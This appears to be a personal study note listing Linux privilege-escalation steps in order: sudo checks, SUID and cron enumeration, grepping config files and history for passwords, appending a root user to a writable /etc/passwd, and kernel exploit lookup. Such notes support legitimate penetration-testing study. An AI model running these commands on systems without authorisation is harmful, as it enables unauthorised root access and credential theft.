## Linux Priv Esc — Order of Operations

1. `sudo -l` — sudo permissions ← **always first**
2. SUID binaries
3. Cron jobs
4. Credential hunting
5. Writable `/etc/passwd`
6. Kernel exploits (last resort)

---

## 1. Sudo Abuse

```bash
sudo -l
```
→ Shows NOPASSWD entries. Look up the binary on **GTFOBins** for the exact exploit path.
→ See [[04_Attack-Chains/sudo-gcore-privesc]] for the gcore memory dump chain.

---

## 2. SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```
→ Runs as file owner (usually root) regardless of who executes. Check every result on **GTFOBins**.

---

## 3. Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
```
→ Look for scripts running as root that you can write to. Modify the script → wait for it to run → shell as root.

---

## 4. Credential Hunting

```bash
cat ~/.bash_history
find / -name "*.conf" -o -name "*.bak" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat /var/www/html/config.php
```
→ History and config files often contain plaintext passwords.

---

## 5. Writable /etc/passwd

```bash
ls -la /etc/passwd
```
→ If writable, add a new root user with a known password hash.

```bash
openssl passwd -1 -salt hack password123
# append: hacker:<hash>:0:0:root:/root:/bin/bash
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

---

## 6. Kernel Exploits

```bash
uname -a
searchsploit linux kernel <version>
```
→ Last resort. Match exact kernel version, transfer binary, execute.

---

## Quick Checklist After Shell

```bash
whoami && id
sudo -l
uname -a
cat /etc/passwd
ps aux | grep root
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

---

## Related Notes

- [[Linux_Common_Commands]]
- [[Priv_Esc]]
